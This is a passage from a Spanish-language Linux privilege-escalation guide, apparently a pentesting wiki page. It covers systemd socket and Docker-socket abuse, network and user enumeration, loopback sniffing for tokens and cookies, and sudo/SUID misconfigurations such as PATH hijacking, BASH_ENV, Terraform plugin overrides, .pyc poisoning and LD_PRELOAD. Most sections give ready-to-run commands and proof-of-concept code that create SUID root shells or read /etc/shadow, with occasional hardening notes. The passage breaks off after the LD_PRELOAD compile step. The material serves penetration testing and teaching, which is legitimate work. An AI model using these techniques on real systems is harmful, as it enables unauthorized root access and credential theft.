Los Unix Domain Sockets (UDS) permiten la **comunicación entre procesos** en la misma máquina o en máquinas diferentes dentro de modelos cliente-servidor. Utilizan archivos descriptores Unix estándar para la comunicación entre ordenadores y se configuran mediante archivos `.socket`.<sup>[[14]](#references)</sup>

Los Sockets se pueden configurar mediante archivos `.socket`.

**Obtén más información sobre los sockets con `man systemd.socket`.** Dentro de este archivo se pueden configurar varios parámetros interesantes:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Estas opciones son diferentes, pero se utiliza un resumen para **indicar dónde escuchará** el socket (la ruta del archivo de socket AF_UNIX, el número IPv4/6 y/o el puerto donde escuchará, etc.)
- `Accept`: Acepta un argumento booleano. Si es **true**, se **inicia una instancia del servicio por cada conexión entrante** y solo se le pasa el socket de conexión. Si es **false**, todos los sockets de escucha se **pasan a la unidad de servicio iniciada**, y solo se inicia una unidad de servicio para todas las conexiones. Este valor se ignora para los sockets de datagramas y FIFOs, donde una única unidad de servicio gestiona incondicionalmente todo el tráfico entrante. **Por defecto es false**. Por motivos de rendimiento, se recomienda escribir los nuevos daemons de forma que sean compatibles con `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Aceptan una o más líneas de comandos, que se **ejecutan antes** o **después** de que los **sockets**/FIFOs de escucha se **creen** y se asocien, respectivamente. El primer token de la línea de comandos debe ser un nombre de archivo absoluto, seguido de los argumentos del proceso.
- `ExecStopPre`, `ExecStopPost`: **Comandos** adicionales que se **ejecutan antes** o **después** de que los **sockets**/FIFOs de escucha se **cierren** y eliminen, respectivamente.
- `Service`: Especifica el nombre de la unidad de **servicio** que se debe **activar** ante **tráfico entrante**. Esta opción solo está permitida para sockets con Accept=no. Por defecto, utiliza el servicio que tiene el mismo nombre que el socket (sustituyendo el sufijo). En la mayoría de los casos, no debería ser necesario utilizar esta opción.

### Archivos .socket modificables

Si encuentras un archivo `.socket` **modificable**, puedes **añadir** al principio de la sección `[Socket]` algo como `ExecStartPre=/home/kali/sys/backdoor`, y el backdoor se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente tendrás que esperar a que la máquina se reinicie.**\
_Ten en cuenta que el sistema debe estar utilizando la configuración de ese archivo socket o el backdoor no se ejecutará_

### Activación de Socket + ruta de unidad modificable (crear un servicio inexistente)

Otra configuración incorrecta de alto impacto es:

- una unidad socket con `Accept=no` y `Service=<name>.service`
- falta la unidad de servicio referenciada
- un atacante puede escribir en `/etc/systemd/system` (u otra ruta de búsqueda de unidades)

En ese caso, el atacante puede crear `<name>.service` y después generar tráfico hacia el socket para que systemd cargue y ejecute el nuevo servicio como root.

Flujo rápido:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets escribibles

Si **identificas cualquier socket escribible** (_ahora estamos hablando de Unix Sockets y no de los archivos de configuración `.socket`_), entonces **puedes comunicarte** con ese socket y quizá explotar una vulnerabilidad.

### Enumerar Unix Sockets
```bash
netstat -a -p --unix
```
### Conexión raw
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Ejemplo de explotación:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Sockets HTTP

Ten en cuenta que puede haber algunos **sockets que escuchen solicitudes HTTP** (_no me refiero a archivos .socket, sino a los archivos que actúan como sockets Unix_). Puedes comprobarlo con:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Si el **socket responde con una** solicitud **HTTP**, entonces puedes **comunicarte** con él y quizá **explotar alguna vulnerabilidad**.

### Docker Socket con permisos de escritura

El socket de Docker, que suele encontrarse en `/var/run/docker.sock`, es un archivo crítico que debe protegerse. De forma predeterminada, tiene permisos de escritura para el usuario `root` y los miembros del grupo `docker`. Tener acceso de escritura a este socket puede provocar una escalada de privilegios. A continuación se explica cómo hacerlo y se muestran métodos alternativos si Docker CLI no está disponible.

#### **Escalada de privilegios con Docker CLI**

Si tienes acceso de escritura al socket de Docker, puedes escalar privilegios mediante los siguientes comandos:<sup>[[15]](#references)</sup>
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Estos comandos permiten ejecutar un contenedor con acceso de nivel root al sistema de archivos del host.

#### **Uso directo de la API de Docker**

Cuando la CLI de Docker no está disponible, el socket de Docker aún puede abusarse usando HTTP sin formato a través del socket Unix. El flujo más fiable es:

- crear un contenedor auxiliar de larga duración con el root del host montado mediante bind
- iniciarlo
- crear una instancia de `exec` dentro de ese auxiliar
- iniciar la instancia de `exec` y leer la salida de vuelta a través de la API

**Listar imágenes de Docker**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**Crear e iniciar un contenedor auxiliar**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**Crear una instancia de exec**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**Inicia la instancia de exec y lee la salida**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
Este patrón suele ser más robusto que intentar controlar `attach` manualmente con `socat` o `nc -U`. Una vez que puedes crear un helper con `/:/host`, puedes usar instancias adicionales de `exec` para leer archivos como `/host/root/...`, añadir claves SSH en `/host/root/.ssh` o modificar archivos de inicio del host.

### Otros

Ten en cuenta que, si tienes permisos de escritura sobre el socket de docker porque estás **dentro del grupo `docker`**, tienes [**más formas de escalar privilegios**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Si la [**API de docker está escuchando en un puerto**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), también podrías comprometerla.

Consulta **más formas de escapar de los containers o abusar de los container runtimes para escalar privilegios** en:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Escalada de privilegios con Containerd (ctr)

Si descubres que puedes usar el comando **`ctr`**, lee la siguiente página, ya que **podrías abusar de él para escalar privilegios**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Escalada de privilegios con **RunC**

Si descubres que puedes usar el comando **`runc`**, lee la siguiente página, ya que **podrías abusar de él para escalar privilegios**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus es un sofisticado **sistema de comunicación entre procesos (IPC)** que permite a las aplicaciones interactuar y compartir datos de forma eficiente. Diseñado teniendo en cuenta los sistemas Linux modernos, ofrece un framework robusto para distintas formas de comunicación entre aplicaciones.<sup>[[16]](#references)</sup>

El sistema es versátil y admite IPC básico, lo que mejora el intercambio de datos entre procesos, de forma similar a los **sockets de dominio UNIX mejorados**. Además, permite difundir eventos o señales, facilitando una integración fluida entre los componentes del sistema. Por ejemplo, una señal de un daemon de Bluetooth sobre una llamada entrante puede hacer que un reproductor de música se silencie, mejorando la experiencia del usuario. Asimismo, D-Bus admite un sistema de objetos remotos, simplificando las solicitudes de servicios y las invocaciones de métodos entre aplicaciones, y agilizando procesos que tradicionalmente eran complejos.

D-Bus funciona mediante un **modelo allow/deny**, gestionando los permisos de los mensajes (llamadas a métodos, emisiones de señales, etc.) según el efecto acumulativo de las reglas de políticas coincidentes. Estas políticas especifican las interacciones con el bus y podrían permitir una escalada de privilegios mediante la explotación de estos permisos.

Se proporciona un ejemplo de este tipo de política en `/etc/dbus-1/system.d/wpa_supplicant.conf`, que detalla los permisos del usuario root para poseer, enviar y recibir mensajes de `fi.w1.wpa_supplicant1`.

Las políticas sin un usuario o grupo especificado se aplican universalmente, mientras que las políticas del contexto "default" se aplican a todo lo que no esté cubierto por otras políticas específicas.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprende a enumerar y explotar una comunicación D-Bus aquí:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Red**

Siempre es interesante enumerar la red y averiguar la posición de la máquina.

### Enumeración genérica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Triaje rápido del filtrado de salida

Si el host puede ejecutar comandos, pero los callbacks fallan, separa rápidamente el filtrado de DNS, transporte, proxy y rutas:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Puertos abiertos

Comprueba siempre los servicios de red que se estén ejecutando en la máquina con los que no hayas podido interactuar antes de acceder a ella:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Clasifica los listeners según el bind target:

- `0.0.0.0` / `[::]`: expuestos en todas las interfaces locales.
- `127.0.0.1` / `::1`: solo locales (buenos candidatos para tunnel/forward).
- IPs internas específicas (por ejemplo, `10.x`, `172.16/12`, `192.168.x`, `fe80::`): normalmente solo accesibles desde segmentos internos.

### Flujo de triage para servicios solo locales

Cuando comprometes un host, los servicios vinculados a `127.0.0.1` a menudo se vuelven accesibles por primera vez desde tu shell. Un flujo local rápido es:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS como network scanner (modo solo red)

Además de las comprobaciones de PE locales, linPEAS puede ejecutarse como un network scanner enfocado. Utiliza los binarios disponibles en `$PATH` (normalmente `fping`, `ping`, `nc`, `ncat`) y no instala herramientas.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Si pasas `-d`, `-p` o `-i` sin `-t`, linPEAS se comporta como un escáner de red puro (omitiendo el resto de las comprobaciones de privilege-escalation).

### Sniffing

Comprueba si puedes capturar tráfico. Si puedes, podrías obtener algunas credenciales.
```
timeout 1 tcpdump
```
Comprobaciones prácticas rápidas:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) es especialmente valioso durante el post-exploitation porque muchos servicios solo internos exponen tokens/cookies/credenciales allí:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Captura ahora, analiza después:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Usuarios

### Enumeración genérica

Comprueba **quién** eres, qué **privilegios** tienes, qué **usuarios** hay en los sistemas, cuáles pueden hacer **login** y cuáles tienen **privilegios de root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Algunas versiones de Linux se vieron afectadas por un bug que permite a los usuarios con **UID > INT_MAX** escalar privilegios. Más información: [aquí](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [aquí](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) y [aquí](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Explotarlo** usando: **`systemd-run -t /bin/bash`**

### Grupos

Comprueba si eres **miembro de algún grupo** que pueda otorgarte privilegios de root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Portapapeles

Comprueba si hay algo interesante dentro del portapapeles (si es posible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de contraseñas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Contraseñas conocidas

Si **conoces alguna contraseña** del entorno, **intenta iniciar sesión como cada usuario** utilizando la contraseña.

### Su Brute

Si no te importa generar mucho ruido y los binarios `su` y `timeout` están presentes en el equipo, puedes intentar hacer brute-force contra usuarios utilizando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con el parámetro `-a` también intenta hacer brute-force contra usuarios.

## Abusos de PATH escribible

### $PATH

Si descubres que puedes **escribir dentro de alguna carpeta de $PATH**, es posible que puedas escalar privilegios **creando un backdoor dentro de la carpeta escribible** con el nombre de algún comando que vaya a ser ejecutado por un usuario diferente (idealmente root) y que **no se cargue desde una carpeta ubicada antes** de tu carpeta escribible en $PATH.

### SUDO y SUID

Es posible que tengas permitido ejecutar algún comando utilizando sudo o que tengan el bit suid. Compruébalo utilizando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Algunos **comandos inesperados permiten leer y/o escribir archivos o incluso ejecutar un comando**.<sup>[[8]](#references)</sup> Por ejemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuración de Sudo podría permitir a un usuario ejecutar algún comando con los privilegios de otro usuario sin conocer la contraseña.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
En este ejemplo, el usuario `demo` puede ejecutar `vim` como `root`; ahora es trivial obtener una shell añadiendo una clave SSH al directorio de `root` o llamando a `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta directiva permite al usuario **establecer una variable de entorno** al ejecutar algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este ejemplo, **basado en la máquina Admirer de HTB**, era **vulnerable** a **PYTHONPATH hijacking** para cargar una biblioteca de Python arbitraria mientras se ejecutaba el script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Poisoning de `__pycache__` / `.pyc` modificable en imports de Python permitidos por sudo

Si un **script de Python permitido por sudo** importa un módulo cuyo directorio de paquete contiene un **`__pycache__` modificable**, es posible que puedas reemplazar el `.pyc` almacenado en caché y conseguir ejecución de código como el usuario privilegiado en el siguiente import.<sup>[[30]](#references)</sup>

- Por qué funciona:
- CPython almacena las cachés de bytecode en `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
- El intérprete valida el **header** (magic + metadatos de timestamp/hash vinculados al source) y, después, ejecuta el objeto de código marshalizado almacenado tras ese header.
- Si puedes **eliminar y recrear** el archivo almacenado en caché porque el directorio es modificable, aún puedes reemplazar un `.pyc` propiedad de root pero no modificable.
- Ruta típica:
- `sudo -l` muestra un script o wrapper de Python que puedes ejecutar como root.
- Ese script importa un módulo local desde `/opt/app/`, `/usr/local/lib/...`, etc.
- El directorio `__pycache__` del módulo importado es modificable por tu usuario o por todos.

Enumeración rápida:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Si puedes inspeccionar el script privilegiado, identifica los módulos importados y su ruta de caché:<sup>[[32]](#references)</sup>
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Flujo de abuso:

1. Ejecuta una vez el script permitido por sudo para que Python cree el archivo de caché legítimo si aún no existe.
2. Lee los primeros 16 bytes del archivo `.pyc` legítimo y reutilízalos en el archivo envenenado.
3. Compila un objeto de código con un payload, aplica `marshal.dumps(...)`, elimina el archivo de caché original y vuelve a crearlo con la cabecera original seguida de tu bytecode malicioso.
4. Vuelve a ejecutar el script permitido por sudo para que la importación ejecute tu payload como root.

Notas importantes:

- Reutilizar la cabecera original es clave porque Python comprueba los metadatos de caché con respecto al archivo fuente, no si el cuerpo del bytecode coincide realmente con el código fuente.
- Esto resulta especialmente útil cuando el archivo fuente pertenece a root y no tiene permisos de escritura, pero el directorio `__pycache__` que lo contiene sí los tiene.
- El ataque falla si el proceso privilegiado usa `PYTHONDONTWRITEBYTECODE=1`, importa desde una ubicación con permisos seguros o elimina el acceso de escritura a todos los directorios de la ruta de importación.

Estructura mínima de prueba de concepto:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Endurecimiento:

- Asegúrate de que ningún directorio de la ruta de importación de Python con privilegios pueda ser modificado por usuarios con pocos privilegios, incluido `__pycache__`.
- Para ejecuciones con privilegios, considera usar `PYTHONDONTWRITEBYTECODE=1` y realizar comprobaciones periódicas en busca de directorios `__pycache__` modificables inesperados.
- Trata los módulos locales de Python modificables y los directorios de caché modificables de la misma forma que tratarías los shell scripts o las shared libraries modificables ejecutados por root.

### BASH_ENV preservado mediante sudo env_keep → shell de root

Si sudoers conserva `BASH_ENV` (por ejemplo, `Defaults env_keep+="ENV BASH_ENV"`), puedes aprovechar el comportamiento de inicio no interactivo de Bash para ejecutar código arbitrario como root al invocar un comando permitido.<sup>[[24]](#references)</sup>

- Por qué funciona: En los shells no interactivos, Bash evalúa `$BASH_ENV` y obtiene el contenido de ese archivo antes de ejecutar el script objetivo. Muchas reglas de sudo permiten ejecutar un script o un shell wrapper. Si sudo conserva `BASH_ENV`, tu archivo se obtiene con privilegios de root.<sup>[[23]](#references)</sup>

- Requisitos:
- Una regla de sudo que puedas ejecutar (cualquier objetivo que invoque `/bin/bash` de forma no interactiva o cualquier bash script).
- `BASH_ENV` presente en `env_keep` (compruébalo con `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Endurecimiento:
- Elimina `BASH_ENV` (y `ENV`) de `env_keep`; prefiere `env_reset`.
- Evita wrappers de shell para comandos permitidos mediante sudo; usa binarios mínimos.
- Considera el registro de E/S de sudo y las alertas cuando se usen variables de entorno conservadas.

### Terraform mediante sudo con HOME conservado (!env_reset)

Si sudo deja intacto el entorno (`!env_reset`) mientras permite ejecutar `terraform apply`, `$HOME` permanece como el del usuario que realiza la llamada. Por lo tanto, Terraform carga **$HOME/.terraformrc** como root y respeta `provider_installation.dev_overrides`.<sup>[[25]](#references)</sup>

- Apunta el provider requerido a un directorio con permisos de escritura y deposita un plugin malicioso con el nombre del provider (por ejemplo, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform fallará durante el handshake del plugin de Go, pero ejecutará el payload como root antes de terminar, dejando un shell SUID.

### Anulaciones de TF_VAR + bypass de validación de symlinks

Las variables de Terraform se pueden proporcionar mediante variables de entorno `TF_VAR_<name>`, que persisten cuando sudo conserva el entorno. Las validaciones débiles, como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, se pueden eludir mediante symlinks:<sup>[[25]](#references)</sup>
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform resuelve el symlink y copia el `/root/root.txt` real en un destino legible por el atacante. El mismo enfoque puede utilizarse para **escribir** en rutas privilegiadas mediante la creación previa de symlinks de destino (por ejemplo, apuntando la ruta de destino del provider dentro de `/etc/cron.d/`).

### requiretty / !requiretty

En algunas distribuciones antiguas, sudo puede configurarse con `requiretty`, lo que obliga a sudo a ejecutarse únicamente desde una TTY interactiva. Si se establece `!requiretty` (o la opción está ausente), sudo puede ejecutarse desde contextos no interactivos, como reverse shells, trabajos de cron o scripts.
```bash
Defaults !requiretty
```
Esto no es una vulnerabilidad directa por sí misma, pero amplía las situaciones en las que se pueden abusar las reglas de sudo sin necesitar una PTY completa.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Si `sudo -l` muestra `env_keep+=PATH` o un `secure_path` que contiene entradas modificables por el atacante (por ejemplo, `/home/<user>/bin`), cualquier comando relativo dentro del objetivo permitido por sudo puede ser suplantado.<sup>[[3]](#references)</sup>

- Requisitos: una regla de sudo (a menudo `NOPASSWD`) que ejecute un script/binario que invoque comandos sin rutas absolutas (`free`, `df`, `ps`, etc.) y una entrada de PATH modificable que se busque primero.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Bypass de rutas en la ejecución de Sudo
**Salta** para leer otros archivos o usar **symlinks**. Por ejemplo, en el archivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_._
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si se utiliza un **wildcard** (\*), es aún más fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/binario SUID sin ruta del comando

Si se concede el **permiso de sudo** para un único comando **sin especificar la ruta**: _hacker10 ALL= (root) less_, puedes explotarlo cambiando la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica también se puede utilizar si un binario **suid** **ejecuta otro comando sin especificar la ruta (comprueba siempre con** _**strings**_ **el contenido de un binario SUID extraño)**.

[Ejemplos de payloads para ejecutar.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binario SUID con ruta del comando

Si el binario **suid** **ejecuta otro comando especificando la ruta**, entonces puedes intentar **exportar una función** con el mismo nombre que el comando que está llamando el archivo suid.

Por ejemplo, si un binario suid llama a _**/usr/sbin/service apache2 start**_, debes intentar crear la función y exportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Entonces, cuando llames al binario SUID, esta función se ejecutará

### Script escribible ejecutado por un wrapper SUID

Una misconfiguración común de una aplicación personalizada es un wrapper binario SUID propiedad de root que ejecuta un script, mientras que el propio script puede ser modificado por usuarios con pocos privilegios.

Patrón típico:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Si `/usr/local/bin/backup.sh` admite escritura, puedes añadir comandos de payload y después ejecutar el wrapper SUID:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Comprobaciones rápidas:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Este attack path es especialmente común en wrappers de "maintenance"/"backup incluidos en `/usr/local/bin`.

### LD_PRELOAD y **LD_LIBRARY_PATH**

La variable de entorno **LD_PRELOAD** se utiliza para especificar una o más shared libraries (archivos `.so`) que serán cargadas por el loader antes que todas las demás, incluida la biblioteca estándar de C (`libc.so`). Este proceso se conoce como preloading de una library.

Sin embargo, para mantener la seguridad del sistema y evitar que esta funcionalidad sea explotada, especialmente con ejecutables **suid/sgid**, el sistema aplica ciertas condiciones:

- El loader ignora **LD_PRELOAD** en ejecutables cuyo ID de usuario real (_ruid_) no coincide con el ID de usuario efectivo (_euid_).
- En ejecutables con suid/sgid, solo se cargan previamente las libraries ubicadas en rutas estándar que también tengan los permisos suid/sgid.

La escalada de privilegios puede ocurrir si tienes la capacidad de ejecutar comandos con `sudo` y la salida de `sudo -l` incluye la declaración **env_keep+=LD_PRELOAD**. Esta configuración permite que la variable de entorno **LD_PRELOAD** persista y sea reconocida incluso cuando los comandos se ejecutan con `sudo`, lo que puede provocar la ejecución de código arbitrario con privilegios elevados.<sup>[[9]](#references)</sup>
```
Defaults        env_keep += LD_PRELOAD
```
Guárdalo como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Después, **compílalo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
